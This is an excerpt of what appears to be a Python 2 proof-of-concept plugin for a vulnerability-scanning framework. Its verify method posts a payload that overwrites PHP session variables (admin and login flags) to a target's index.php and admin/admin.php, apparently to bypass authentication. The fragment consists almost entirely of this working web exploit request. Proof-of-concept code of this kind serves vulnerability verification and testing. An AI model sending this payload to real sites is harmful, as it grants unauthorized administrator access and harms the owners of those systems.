...
class MyPoc(BaseFrame):
    ...
    def verify(cls, args):
        ...
        post_data = '_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=3000000000000000000000\r\n'
        url = args['options']['target'] + '/index.php'
        request = urllib2.Request(url, data=post_data)
        response = urllib2.urlopen(request)

        url = args['options']['target'] + '/admin/admin.php'
        request = urllib2.Request(url, data=post_data)
        response = urllib2.urlopen(request)
